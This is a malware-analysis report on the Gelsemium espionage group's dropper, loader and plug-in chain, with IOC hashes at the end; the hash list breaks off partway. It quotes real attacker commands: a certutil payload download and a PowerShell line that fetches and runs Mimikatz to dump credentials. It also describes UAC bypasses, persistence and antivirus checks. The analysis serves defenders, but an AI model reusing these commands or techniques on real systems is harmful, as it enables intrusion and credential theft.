{
    "id": "6e62ede9-7997-4602-ac95-373a8a176674",
    "created_at": "2022-10-25T16:48:24.943823Z",
    "updated_at": "2025-03-27T02:12:18.341987Z",
    "deleted_at": null,
    "sha1_hash": "e189bd6b2f7a00f2a834e268ac8196e0a3e7dc84",
    "title": "",
    "authors": "",
    "file_creation_date": "2021-06-14T09:01:52Z",
    "file_modification_date": "2021-06-14T09:02:00Z",
    "file_size": 2488050,
    "plain_text": "# GELSEMIUM\n\n##### Authors: Thomas Dupuy Matthieu Faou\n\n\n-----\n\n## TABLE OF CONTENTS\n\nEXECUTIVE SUMMARY .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 2\n\nOVERVIEW  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 2\n\nPaleobotany  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 2\n\nTargets .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 3\n\nDelivery .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   . 3\n\nNetwork infrastructure  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  4\n\nTECHNICAL ANALYSIS .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 5\n\nGelsemine: The dropper  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 5\n\nGelsenicine: The loader .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   9\n\nGelsevirine: The main plug-in .   .   .   .   .   .   .   .   .   .   .   .   .   . 10\n\nAdditional Links/Tools .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .12\n\nCONCLUSION  .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   14\n\nIOCS .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 15\n\nAdditional Links/Tools .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .15\n\nC&C servers .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  17\n\nMITRE ATT&CK TECHNIQUES .   .   .   .   .   .   .   .   .   .   .   .   .   .   .  17\n\n##### Authors: Thomas Dupuy Matthieu Faou\n\n June 2021\n\n\n-----\n\n## EXECUTIVE SUMMARY\n\nIn mid-2020, ESET researchers started to analyze multiple campaigns, later attributed to the Gelsemium\n\ngroup, and tracked down the earliest version of the malware going back to 2014. Victims of these\n\ncampaigns are located in East Asia as well as the Middle East and belong to governments, religious\n\norganizations, electronics manufacturers and universities.\n\n**Key points in this report:**\n\n- ESET researchers believe that Gelsemium is behind the supply-chain attack against BigNox that was\n\n[previously reported as Operation NightScout](https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/)\n\n- ESET researchers found a new version of Gelsemium, complex and modular malware, later referred as\n\nGelsemine, Gelsenicine and Gelsevirine\n\n- New targets were discovered that include governments, universities, electronics manufacturers and\n\nreligious organizations in East Asia and the Middle East\n\n- Gelsemium is a cyberespionage group active since 2014\n\n## OVERVIEW\n\nThe Gelsemium group has been active since at least 2014 and was described in the past by a few\n\nsecurity companies. Gelsemium’s name comes from one possible translation we found while reading\n\n[a report from VenusTech who dubbed the group 狼毒草 for the first time. It’s the name of a genus of](https://www.venustech.com.cn/uploads/2018/08/231401512426.pdf)\n\n[flowering plants belonging to the family Gelsemiaceae, Gelsemium elegans is the species that contains](https://en.wikipedia.org/wiki/Gelsemiaceae)\n\ntoxic compounds like Gelsemine, Gelsenicine and Gelsevirine, which we chose as names for the three\n\ncomponents of this malware family.\n\n### Paleobotany\n\n[In 2014, G DATA published a white paper about Operation TooHash, a campaign where victims seemed](https://public.gdatasoftware.com/Presse/Publikationen/Whitepaper/EN/GDATA_TooHash_CaseStudy_102014_EN_v1.pdf)\n\nto be located in East of Asia based on the documents used in the campaign. The operators used\n\n[spearphishing with attachments exploiting a then-old vulnerability in Microsoft Office (CVE-2012-0158)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158)\n\nas well as three components, two of which were signed with a stolen certificate.\n\n[In 2016, Verint Systems presented at HITCON where they talked about new activity of the TooHash](https://hitcon.org/2016/pacific/0composition/pdf/1202/1202 R0 0930 an intelligance-driven approach to cyber defense.pdf)\n\noperation mentioned two years earlier; it used the same exploit against Microsoft Office and a domain\n\nwas reused.\n\n[In 2018, VenusTech wrote a detailed white paper where they referred to an unknown APT group named](https://www.venustech.com.cn/uploads/2018/08/231401512426.pdf)\n\n狼毒草 for the first time. In that report, they described malware components sharing a lot of artifacts\n\nwith the malware described below. After comparison, VenusTech’s findings are an earlier variant of\n\nGelsemium group malware. We agree with the findings and we provide additional new activities that\n\ndefine this group. VenusTech also linked an older version of the malware to Operation TooHash.\n\n\n-----\n\n### Targets\n\nDuring the past years, the Gelsemium group deployed their malware against a small number of victims,\n\nsuggesting that the group is involved in cyberespionage. Targets mentioned in previous reports are in\n\nline with some victims we identified during our current research. Governmental institutions, electronics\n\nmanufacturers, universities and religious organizations were targeted in Eastern Asia and the Middle\n\nEast. Previous reports mention organizations located in Taiwan.\n\nFigure 1 // Target’s location\n\n### Delivery\n\nThe Gelsemium group uses different techniques to deliver its malware. While we were not always able\n\nto retrieve the initial compromise vector, we identified hints that indicate the likely entry points the\n\ngroup used.\n\nThe first vector observed in 2014 and 2016 was spearphishing documents using exploits targeting\n\n[a Microsoft Office vulnerability (CVE-2012-0158). This technique was used in the past as mentioned](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0158)\n\nby G DATA and Verint Systems. For example, documents such as a resume written in Chinese were\n\ndistributed to lure the victim.\n\nThe second vector is the use of watering holes. In 2018 VenusTech mentioned a watering hole as a\n\nvector of compromise where the operator used an intranet server to carry out the attack. Additionally,\n\n[we recently released an article about the BigNox supply-chain attack. We observed victims being](https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/)\n\ncompromised by this supply-chain attack and shortly after a Gelsemium first stage was dropped on the\n\nsame machine.\n\n\n-----\n\nLastly, in 2020, one vector was found where operators probably used an exploit targeting a\n\n[vulnerability in the Exchange Server. Recently, we documented such a vector of compromise where](https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/)\n\nattackers leveraged a pre-authentication RCE in Exchange Server to install webshells. Application pool\n\nMSExchangeOWAAppPool might have been hijacked in this case to deploy a ChinaChopper webshell\n\nand later run Gelsemium’s first stage. We believe that the vulnerability exploited could be\n\n_[CVE-2020-0688, as the timeline fits and also Microsoft released an article following the security fix](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-0688)_\n\nindicating usage of exploits in the wild targeting this vulnerability. In some cases, attackers used\n```\ncertutil.exe (a known LOLBin) in order to download Gelsemine:\ncertutil -urlcache -split -f http://45.83.237[.]34:9999/server.exe C:\\Windows\\\nTemp\\serv.exe\n\n```\n[During our investigation we found victims where Mimikatz was dropped on machines. The operator uses](https://github.com/gentilkiwi/mimikatz)\n\na Powershell version of the tool, downloaded from a remote server. The same remote server was used\n\nto download a remote shell into the machine, which probably creates another way for the Gelsemium\n\noperators to get access to the internal network of the victim. This scenario leans on operators already\n\nhaving a foothold in the organization. More specifically, we saw the following command line executed\n\nby the MSExchangeOWAAppPool service:\n```\ncmd /c cd /d “c:\\PerfLogs\\Admin”&powershell.exe “IEX (New-Object Net.WebClient).\nDownloadString(‘http://95.179.157[.]174/19733791/katz.ps1’); Invoke-Mimikatz\n-DumpCreds” >1.txt&echo [S]&cd&echo [E]\n\n```\nThe &echo [S]&cd&echo [E] at the end denotes the presence of a ChinaChopper webshell on the\n\nsystem.\n\n### Network infrastructure\n\nA distinctive characteristic of the Gelsemium group (but not unique to it) is the use of Dynamic DNS\n\n(DDNS) domain names for Gelsevirine C&C servers. Unlike regular domain names, DDNS domains\n\nare cheaper and there is no list of newly created domains. This complicates the tracking of such\n\ninfrastructure, but they are easier to block as their ratio of maliciousness is generally very high\n\ncompared to .com or other common top-level domains. Of 20 different C&C servers we identified,\n\nonly four were regular domains: hkbusupport[.]com, 4vw37z[.]cn, boshiamys[.]com and\n```\n96html[.]com.\n\n```\nThose 16 DDNS domains were registered at the following providers:\n\n- `dns04[.]com`\n\n- `dns1[.]us`\n\n- `dynamic-dns[.]net`\n\n- `hopto[.]org`\n\n- `ns1[.]name`\n\n- `otzo[.]com`\n\n- `zyns[.]com`\n\n- `zzux[.]com`\n\nOn the hosting side, we did not observe any strong preferences. Operators rented servers at multiple\n\ndifferent hosting providers located all around the world. We believe that this absence of apparent\n\npattern is intended to make the tracking of their network infrastructure harder.\n\n\n-----\n\n## TECHNICAL ANALYSIS\n\nGelsemium’s whole chain might appear simple at first sight, but the exhaustive configurations,\n\nimplanted at each stage, modify on-the-fly settings for the final payload, making it harder to\n\nunderstand. Behaviors analyzed below are tied to the configuration; as a result, filenames and paths\n\nmay be different in other samples. Most of the campaigns we observed follow what we describe here.\n\nThe overview shown in Figure 2 illustrates the workflow.\n\n#### Attack vector\n\ndrop\n\ndrop Gelsemine\n\n#### Gelsenicine drop\n\nload Gelsevirine\n\ncontact\n\n#### C&C server\n\nFigure 2 // Overview of the three components’ workflow\n\n### Gelsemine: The dropper\n\nGelsemium’s first stage is a large dropper written in C++ using the Microsoft Foundation Class library\n\n(MFC). This stage contains multiple further stages’ binaries. Dropper sizes range from about 400 kB\n\nto 700 kB, which is unusual and would be even larger if the eight embedded executables were not\n\n[compressed. The developers use the zlib library, statically linked, to greatly reduce the overall size.](https://zlib.net/)\n\nBehind this oversized executable is hidden a complex yet flexible mechanism that is able to drop\n\ndifferent stages according to the characteristics of the victim computer, such as bitness (32-bit vs.\n\n64-bit) or privilege (standard user vs. administrator). Almost all stages are compressed, located in the\n\nresource section of the PE and mapped into the same component’s memory address space. Figure 3\n\nillustrates all stages in the Gelsemine component.\n\n\n-----\n\nFigure 3 // Gelsemine address space overview\n\nGelsemine’s authors use a lot of junk code so that the functions that matter are hidden in plain sight.\n\nFigure 4 shows such junk code inserted by the developers. It serves two purposes. The first is from\n\na dynamic analysis point of view; running Gelsemine in a sandbox outputs a lot of activity. A huge\n\namount of registry and file system activity is created by trying to open random files and registry keys,\n\nmaking it hard to spot the true malware behavior. The second purpose is from a static analysis point of\n\nview; again, it makes the analyst’s job harder to visually filter out the junk code and focus on only the\n\nimportant functionalities; see the highlighted red box (in the Figure 4).\n\nFigure 4 // Hex-Rays output indicating the extent of junk code – highlighted code is actual malware code\n\n\n-----\n\nGelsemium embeds a loader (Gelsemine second stage) that itself, according to the DLL name, embeds a\n\ndropper named main.dll. In order to execute the loader, a few steps are required:\n\n- Retrieve the encrypted, compressed DLL from the resource section\n\n- Decrypt the decompressed DLL using an XOR loop with a single-byte key (first byte of the encrypted\n\nresource)\n\n- Decompress the DLL via zlib\n\n- Retrieve custom encrypted shellcode and decrypt it\n\n- Call the shellcode to map the DLL sections into memory\n\n- [Call its DllEntryPoint](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-entry-point-function)\n\nThe loader (Gelsemine second stage) is straightforward and has no obfuscation; it simply retrieves its\n\nresource section and uses another instance of the shellcode to call the export impl_function from\n```\nmain.dll. Notice that the shellcode used is the same code but it’s another instance retrieved from the\n\n```\nloader that’s being used.\n\nLast stage, main.dll mentioned above is very interesting and contains features that alter the way\n\nGelsenicine and Gelsevirine are delivered. It drops Gelsenicine and stores Gelsevirine in the Windows\n\nregistry (as explained in the next section). This stage contains checks to verify the presence of certain\n\nsecurity products by iterating over running processes and looking for strings that match specific product\n\nfilenames. The list of security products has evolved over time. Below is the list of security product names\n\nin the most recent version:\n\n- `360tray.exe (Qihoo 360 Technology Co. Ltd.)`\n\n- `avp.exe (Kaspersky Lab)`\n\n- `rstray.exe (Rising Antivirus)`\n\n- `bdagent.exe, vsserv.exe, bdredline.exe, updatesrv.exe (Bitdefender)`\n```\nmain.dll uses UAC bypass to elevate process privileges on the system. It contains three bypasses,\n\n```\nallowing some flexibility regarding the operating system found. These bypasses (see Table 1) are old but\n\ncan work on a system that is not fully up to date.\n\nUAC bypass name Condition\n\nUAC bypass using token manipulation Windows 7\n\nUAC bypass using registry hijacking Windows 10\n\nUAC bypass using IARPUninstallStringLauncher COM interface Rising AV or Bitdefender is present\n\nTable 1 // UAC bypass list\n\nAll components from the Gelsemium family share a complex configuration: for instance, the suffix\n```\n_low means that the value of the key is used when it’s a standard user. Another suffix added by the\n\n```\ndevelopers is 64, which means that the value is for 64-bit systems. It is important to emphasize that\n\nnone of the components contains the entire config; they only have fields that are relevant to the\n\ncomponent. For example, Table 2 is the config for Gelsemine.\n\n\n-----\n\nKey Value\n\npulse `winprint.dll, winemf.dll`\n\npulse_low `CommonAppData/Google/Chrome/Application/Library/chrome_elf.dll`\n\nservice_load_path N/A\n\nservice_load_path64 N/A\n\nmain Offset\n\nmain64 Offset\n\npluginkey `8825FC47153E264D`\n\nmainpath `registry;HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\Display\\Image;Pixel`\n\nmainpath64 `registry;HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\Display\\Image;Pixel`\n\nmainpath_low `registry;HKEY_CURRENT_USER\\SOFTWARE\\Intel\\Display\\Image;Pixel`\n\nmainpath64_low `registry;HKEY_CURRENT_USER\\SOFTWARE\\Intel\\Display\\Image;Pixel`\n\nload Offset\n\nload64 Offset\n\nload_low Offset\n\nload64_low Offset\n\nAfterInstallation `RemoveInstaller`\n\nTable 2 // Gelsemine configuration\n\n- `pulse contains two filenames: winprint.dll is the file to be replaced by Gelsenicine`\n\nand winemf.dll is the new filename of the legitimate winprint.dll\n\n- `main contains the offset in the resources section of Gelsevirine (compressed)`\n\n- `pluginkey contains the RC4 key used to encrypt Gelsevirine`\n\n- `mainpath contains the type and the path where Gelsevirine is dropped; two types can be set:`\n```\n registry or file\n\n```\n- `load contains the offset in the resources section of Gelsenicine`\n\n- `AfterInstallation contains the action to perform after everything is launched`\n\nThe AfterInstallation field deletes Gelsemine from the system, if it is present, by executing the\n\nfollowing batch script:\n\nrem filepath: %TMP%\\vmount.bat\n```\nset p1=”C:\\PerfLogs\\Admin\\update.exe”\n:nf\n\n```\ndel %p1%\n\nif exist %p1% goto nf\n\ndel “%~f0”\n\n\n-----\n\n### Gelsenicine: The loader\n\nGelsenicine is a loader that retrieves Gelsevirine and executes it. There are two different versions of the\n\nloader – both of them are DLLs; however, they differ in the context where Gelsemine is executed.\n\nFor users with administrator privileges, Gelsemine drops Gelsenicine at C:\\Windows\\System32\\\n```\nspool\\prtprocs\\x64\\winprint.dll (user-mode DLL for print processor) that is then automatically\n\n```\nloaded by the spoolsv Windows service. To write a file under the %WINDIR%/system32 directory,\n\nadministrator privileges are mandatory; hence the requirement previously mentioned. Figure 5\n\nillustrates differences between the legitimate DLL and Gelsenicine’s malicious one.\n\nFigure 5 // Legitimate winprint.dll (left) vs. Gelsenicine (right)\n\n\n-----\n\nIt’s easy to notice the differences between the sizes of the two binaries as well as the (un)verified\n\nsignature. The example is for the 64-bit version of Gelsenicine but there is also a version for 32-bit\n\nsystems. Loading Gelsenicine when users start their sessions ensures the persistence of the component.\n\nUsers with standard privileges compromised by Gelsemine drop Gelsenicine under a different\n\ndirectory that does not require administrator privileges. The DLL chrome_elf.dll is dropped under\n```\nCommonAppData/Google/Chrome/Application/Library/. Unlike the previous one, this one does\n\n```\nnot replace an existing library; it just tries to mimic a legitimate filename. The persistence is set in the\n\nWindows registry path CurrentVersion\\Run with Chrome Update as the key value; the value looks\n\nlike a legitimate entry. Both winprint.dll and chrome_elf.dll are similar and share code with\n\nGelsemine, like the junk code obfuscation and the check for system bitness.\n\nGelsenicine embeds a config similar to Gelsemine but some fields are not present because they are not\n\nrelevant in the Gelsenicine context, for instance AfterInstallation. This config contains Gelsevirine’s\n\nlocation, filename, and an RC4 key used to decrypt it from the Windows registry. It’s then loaded in\n\nmemory using the same shellcode loader (mentioned in the Gelsemine: The dropper section) and\n\ncalls the DllEntryPoint with a few arguments. One of them is important and it’s set to 1, allowing\n\nGelsevirine to start properly. Interestingly, Gelsevirine will never be written to disk unencrypted since it\n\nwill always be loaded by Gelsemine in the same address space.\n\n### Gelsevirine: The main plug-in\n\nGelsevirine is the last stage of the chain and it is called MainPlugin by its developers, according to\n\nthe DLL name and also PDB path found in old samples (Z:\\z_code\\Q1\\Client\\Win32\\Release\\\n```\nMainPlugin.pdb). It’s also worth mentioning that if defenders manage to obtain this last stage alone,\n\n```\nit won’t run flawlessly since it requires its arguments to be set up by Gelsenicine.\n\nThe config used by Gelsenicine contains a field named controller_version that we believe it is the\n\nversioning used by the operators for this main plug-in. Figure 6 provides a timeline of the different\n\nversions we have observed in the wild; the dates are approximate.\n\n\n##### 2014\n```\n1.0.11.00100\n\n```\n\n##### 2015\n```\n1.0.19.00133\n\n```\n\n##### 2017\n```\n1.0.29.00335\n\n```\n\n##### 2019\n```\n1.1.03.01179\n1.1.06.01262\n1.1.07.01316\n1.1.10.01458\n1.1.12.01614\n\n```\n\n##### 2020\n```\n2.2.6.1530\n\n```\n\nFigure 6 // Gelsevirine version timeline\n\nOne significant change or modification observed was in the config between 1.0.x and 1.1.x. The names of\n\nthe keys changed, and some old keys were no longer present in the new config.\n\nGelsevirine builds a table with a custom checksum of the name of the command and a pointer to the\n\nfunction that performs the command. Some commands have a checksum entry in the table but a “do\n\nnothing” function is associated with the command.\n\n\n-----\n\n```\nstruct commands {\n char checksum_loaded_plugins_command_response_read_command[8];\n int *function_loaded_plugins_command_response_read_command;\n int unknown;\n char checksum_loaded_plugins_command_response_write_data[8];\n int *function _loaded_plugins_command_response_write_data; // points to a\nfunction returning 0\n // […]\n};\n\n```\nCommands like response_read_command are methods from a class like disable_plugin_command.\n\nVenusTech’s article explains in detail the network protocol the hardcoded values assigned to specific\n\ncommands; here, the checksums replace this method in a clever way. Gelsevirine embeds in its resource\n\nsection a config where some fields are shared with other members of the family and some are specific\n\nto this component see Table 3.\n\nKey Value\n\nsetting_persist `registry;HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Intel\\\\Display\\\\Guim;AdapterID`\n\nsetting_persist_low file;CommonAppData/Windows Media Kit/language/en-gb/conf\n\nTable 3 // Config location Gelsevirine\n\nThe complete config is saved under the value set by setting_persist and it is encrypted with RC4\n\nwith a key (not the already mentioned pluginkey). The key can be saved in the Windows registry if\n\nthe user is a member of the administrator group; if not, it’s saved in a file. Notice that the config is\n\noverwritten as soon as it is modified.\n\nGelsemium has a complex setup to communicate to the C&C server: it uses an embedded DLL to act as\n\na man-in-the-middle to establish contact and a config to handle various types of protocols (tcp, udp,\n```\nhttp and https) see Table 4.\n\n```\nKey Value\n\naddress_list protocol0:domain0:port0;protocol1:domain1:port1;[…]\n\ncommunication_protocol `https;http`\n\nproxys <path>\n\nTable 4 // Config C&C Gelsevirine\n\nThe Tcp.dll is mapped into the same address space as Gelsevirine (therefore Gelsemine) and it exports\n\ntwo functions, create_session_proxy and create_native_seesion (the spelling mistake is from\n\nthe developer). If there is no proxy on the machine, it calls the native session export, which returns a\n\nvirtual table with all methods needed to communicate with the C&C server.\n\n\n-----\n\nGelsevirine loads plug-ins provided by the C&C server but unfortunately, we didn’t manage to retrieve\n\nany. However, VenusTech retrieved some plug-ins and briefly explained their purpose:\n\n- `FxCoder is a compression decompression plug-in for C&C communications`\n\n- `Utility is a file system plug-in (read, write files…)`\n\n- `Inter is a plug-in that allows the injection of DLLs into specific processes`\n\n### Additional Links/Tools\n\nDuring our investigation we encountered some interesting malware described in the following sections.\n\n##### Operation NightScout (BigNox)\n\n[In January 2021, another ESET researcher analyzed and wrote an article about Operation NightScout; a](https://www.welivesecurity.com/2021/02/01/operation-nightscout-supply-chain-attack-online-gaming-asia/)\n\nsupply-chain attack compromising the update mechanism of NoxPlayer, an Android emulator for PCs\n\n[and Macs, and part of BigNox’s product range with over 150 million users worldwide. The investigation](https://www.bignox.com/)\n\nuncovered some overlap between this supply-chain attack and the Gelsemium group. Victims originally\n\ncompromised by that supply-chain attack were later being compromised by Gelsemine. Among the\n\ndifferent variants examined, “variant 2” from the article, shows similarities with Gelsemium malware:\n\n- They share the same directory where there are downloaded (C:\\Intel\\)\n\n- Their filenames are identical (intel_update.exe)\n\n- They embed two versions of the payload (32- and 64-bit)\n\n- There is some network overlap (210.209.72[.]180)\n\nUnfortunately, we did not observe links as strong as one campaign dropping or downloading a payload\n\nthat belongs to the other campaign, but we conclude, with medium confidence, that Operation\n\nNightScout is related to the Gelsemium group.\n\n##### OwlProxy: The mysterious grass\n\nAcross the victims and malware we analyzed here, an interesting piece of malware stood out and\n\nneeded a deeper look. From an initial, quick analysis, it was recognized as OwlProxy; an HTTP proxy\n\n[server. A complete analysis can be found in this Cycraft post. This module also comes in two variants](https://medium.com/cycraft/taiwan-government-targeted-by-multiple-cyberattacks-in-april-2020-3b20cea1dc20)\n\n– 32- and 64-bit versions – and as a result it contains a function to test the Windows version as in the\n\nGelsemium components.\n\nIt also shares some code similarities with Gelsevirine malware:\n\n- As seen in Figure 7, they both use the same string, System/calc.exe, and the same legitimate binary\n\nfor timestomping\n\n- They both use similar code to retrieve specific Windows directories, as seen in Figure 8\n\nFigure 7 // Uses calc.exe path for timestomping (right Gelsevirine)\n\n\n-----\n\nFigure 8 // Function to resolve path env (right Gelsevirine)\n\nThis could indicate code sharing between the two authors but it’s important to take these traces with a\n\ngrain of salt as these small similarities could also be due to some code shared from a forum or an online\n\ncode sharing platform.\n\n##### Chrommme\n\nChrommme is a backdoor we found during our adventures in the Gelsemium ecosystem. Code\n\nsimilarities with Gelsemium components are almost nonexistent but small indicators were found during\n\nthe analysis that leads us to believe that it’s somehow related to the group. The same C&C server was\n\nfound in both Gelsevirine and Chrommme, both are using two C&C servers. Chrommme was found on\n\nan organization’s machine also compromised by Gelsemium group.\n\nWritten using the MFC framework (like Gelsemine), this backdoor contains two interesting sections;\n```\ndata1 and data2. The data2 section contains encrypted code, while data1 is a placeholder for the next\n\n```\nstage.\n\nSection data2 is decrypted (using a combination of addition and subtraction routines) and it retrieves\n\nbasic information like IP address and username, then stores them encrypted on the disk. The next part\n\nqueries the C&C server, then it retrieves the code for the backdoor and decrypts that into its data1\n\nsection. The response expected that contains the code is seen in Figure 9.\n\nThe decryption routine is simple – it looks for the inita variable value (here mmagpbskrw), then it\n\nlooks for the value of the variable with that name (here FI6NJTzB7cFjbEcw5Ur5TwpilKZrD[…]). The\n\nAES ECB algorithm is used to decrypt this blob with a 32-bit key split in two. The first half of the key\n\ncorresponds to the inita variable value while the second part is in the malware. Once concatenated,\n\nthe new string is hashed using the MD5 algorithm and used as a key.\n\nFigure 9 // Response from Chrommme’s C&C server\n\n\n-----\n\nOnce the code is loaded into memory, it behaves like a common backdoor, using the same network\n\nprotocol as above. Table 5 below summarizes the commands used by the backdoor.\n\nCommand number Description\n\n0x3E Write file\n\n0x3F Read file\n\n0x3D – Driver List drives\n\n0x3D – Modifyha Debug string used by the operator (alias)\n\n0x3D – ModifyhS Debug string used by the operator (sleep time)\n\n0x3D – Get_SCREEN Take screenshot\n\nDebug string used by the operator (Close RC OK!\\r\\n) Terminate process\n0x3d – CloseRC\nfor the remote connection\n\n0x41 Terminate process\n\n0x42 Update settings file (contains: sleeptime, IP address, computer & username…)\n\n0x44 Sleep + request new command\n\n0x4A Send current settings file\n\n0x4C Execute command (via WinExec Windows API)\n\n0x4D Send screenshot\n\nTable 4 // Config C&C Gelsevirine\n\nThere are some interesting aspects to this sample. No information is sent to the C&C server when the\n\nfirst request is sent, meaning that the operators automatically deliver the next stage. The operators\n\ndon’t have an efficient way to filter out victims or researchers trying to get the next stage, which could\n\nmean two things – the operators already know that the target is deemed appropriate to distribute the\n\nnext stage or it’s the developer’s mistake or lack of attention. However, it’s important to mention that\n\nwe found this sample on a victim’s computer after the operator tried to compromise the target with\n\nGelsemium components.\n\n## CONCLUSION\n\nThe Gelsemium biome is very interesting: it shows few victims (according to our telemetry) with a\n\nvast number of adaptable components. The plug-in system shows that developers have deep C++\n\nknowledge. Small similarities with known malware tools shed light on interesting, possible overlaps\n\nwith other groups and past activities. We hope that this research will drive other researchers to publish\n\nabout the group and reveal more roots related to this malware biosphere.\n\n\n-----\n\n## IOCS\n\n### Additional Links/Tools\n\nSHA-1 Detection Description\n\n`029407C923C279803C6D7CBC7673936BCA2E580C` `Win64/Gelsemium.B` Gelsevirine\n\n`0471E1A214F458D4C478677EC9896B0F31207377` `Win32/Gelsemium.A` Gelsenicine\n\n`055F1E13E0FEA44DC42E8CD8C9219ED588360304` `Win32/Kryptik.HGCE` Gelsemine\n\n`0CEDFB1789EF139B6040CF8D84BA130360C4EB7D` `Win32/TrojanDropper.Gelsemium.A` Gelsemine\n\n`1042C798D7FF69EB52CBEAE684C74FC0EE84AACD` `Win32/TrojanDropper.Gelsemium.A` Gelsemine\n\n`1DD4E8119EFB34BEAEC6AF55B66222D3DC5036EB` `Win32/Gelsemium.A` Gelsevirine\n\n`21C9B87A8CF75DEBA6CFF8CF66AA015D6FB46BE2` `Win64/Gelsemium.B` Gelsevirine\n\n`225FA75D48C7699C3961DB1904993E39AE051940` `Win32/Gelsemium.A` Gelsenicine\n\n`239DB66FAA803772F2A8905B1E77377A5BF78351` `Win32/Gelsemium.A` Gelsenicine\n\n`2B03FFE35090CE5F9341E046464C9EED8A64441D` `Win32/Gelsemium.A` Gelsevirine\n\n`2D6CEAF73EA7F70135D9A82A397625C89C408F05` `Win32/TrojanDropper.Gelsemium.A` Gelsemine\n\n`2F795D69641312B6653B59C2653D7BF368A4405F` `Win64/Gelsemium.B` Gelsevirine\n\n`366A9E646A167FCD2381BC15905F7D7A5E76A100` `Win64/Gelsemium.C` Gelsenicine\n\n`36E46AD4A9F31634D32B26BDBA618DF5ECDCA188` `Win64/Gelsemium.B` Gelsevirine\n\n`374C38E11C50F5EDDD8F3708C557529A62446A4E` `Win32/Gelsemium.A` Gelsevirine\n\n`39D7BBF6B95FA8BF37FE434DC6EFE380BBF9AB23` `Win64/Gelsemium.C` Gelsenicine\n\n`43D27A9C57D252999259AAFEE9760BDA00D1207D` `Win64/Gelsemium.D` Gelsevirine\n\n`43EEC66F6D68F286357004DC62D6DA01991A2EB8` `Win64/Gelsemium.A` Gelsevirine\n\n`47E0BC09B9B092BF5DE415E663BD848917EA8303` `Win32/Gelsemium.A` Gelsenicine\n\n`4A932622A1A5259E9C97EBFA8DC11FA84DFFE039` `Win32/Kryptik.HKQI` Gelsemine\n\n`544717EF96A59135CD0A93886C273E3FFE702C1A` `Win32/Gelsemium.A` Gelsevirine\n\n`5EACCE21513D29A6F318B338D3EE39CC2752F72B` `Win32/Gelsemium.A` Gelsevirine\n\n`625E0D33966E4060D57C1DACA5EB6D1A51BBA3C3` `Win64/Gelsemium.C` Gelsenicine\n\n`6AE33A9DF4E7D5D19C67EDC1D1B73C1674FF5FC1` `Win32/Kryptik.HKQI` Gelsemine\n\n`6EDBF71680F11681EEA34BE293F5C580DE2E16E0` `Win32/Gelsemium.A` Gelsevirine\n\n`6F22C761898A3DB9A3788967D90A77331DFA66B3` `Win32/Gelsemium.A` Gelsevirine\n\n`6F23354186659CD2A02A5521B39F6246199D83AF` `Win64/Gelsemium.B` Gelsevirine\n\n\n-----\n\nSHA-1 Detection Description\n\n`6F43FE80806A3FE5C866C0B63CC5B105A85D0E75` `Win32/Kryptik.HKQI` Gelsemine\n\n`78102E569C4F40D011D941BDD8FCAAB508EDACD6` `Win32/Gelsemium.A` Gelsevirine\n\n`796EBB4074DDE56FC1EDEFED0628DB68B0857E8A` `Win32/Gelsemium.A` Gelsevirine\n\n`7B79C0C0E6D9D1760005416A463BEEA4518B822C` `Win64/Gelsemium.C` Gelsenicine\n\n`7E5BF24946C77A96532DA6FD09EAA1EC4E6F1A91` `Win32/Gelsemium.A` Gelsenicine\n\n`8090D015D6770E6826F3A9266DD3B0998D30DDC3` `Win64/Gelsemium.C` Gelsenicine\n\n`88E4679E9A47A51BD82DC22460B5A69FD7D12ACC` `Win32/Gelsemium.B` Gelsenicine\n\n`8AB3ACC8A3F89E5B8E7A1929149D273EDDADAE64` `Win32/TrojanDropper.Gelsemium.A` Gelsemine\n\n`8BF0CAB4A700BED3E5D7D38C8868D4F388DF9A54` `Win64/Gelsemium.B` Gelsevirine\n\n`988A70DF8A39034CE817D6B968E48103D824A426` `Win64/Gelsemium.B` Gelsenicine\n\n`9A2DAF6CF400408F1714EF9BA659F7491BDAB612` `Win64/Gelsemium.B` Gelsevirine\n\n`9C99EB944DB0797682D54A57E2782956223E9BD8` `Win64/Gelsemium.B` Gelsevirine\n\n`A20C5BF7A30F597524A74D78DFE7EF6F15EDAD52` `Win64/Gelsemium.C` Gelsenicine\n\n`A80C7010FEA9915A0A82108139AEC3AA2363F0DF` `Win32/Kryptik.HKQI` Gelsemine\n\n`B663C7381F53C2FA6D4619A5FE7D63D3FD7A3455` `Win32/Gelsemium.A` Gelsevirine\n\n`BCA97BF7E93309E49311701B22569395B2BAECC7` `Win32/Kryptik.HKQI` Gelsemine\n\n`C64435CCD604E142C6498417D66B4950C7C6B670` `Win32/Gelsemium.A` Gelsenicine\n\n`CA25FB923F8A8F0293E52893979B7E429E913D7B` `Win32/Gelsemium.A` Gelsenicine\n\n`CF4210F762798486CC9D4911D2D9F0F6B2BDF687` `Win64/Gelsemium.C` Gelsenicine\n\n`DCB4D0A47EA40FE4420B14552082E03E0E5FDA9D` `Win32/Gelsemium.A` Gelsevirine\n\n`ECA6363825C079099F3729097C06808AC32D4547` `Win64/Gelsemium.C` 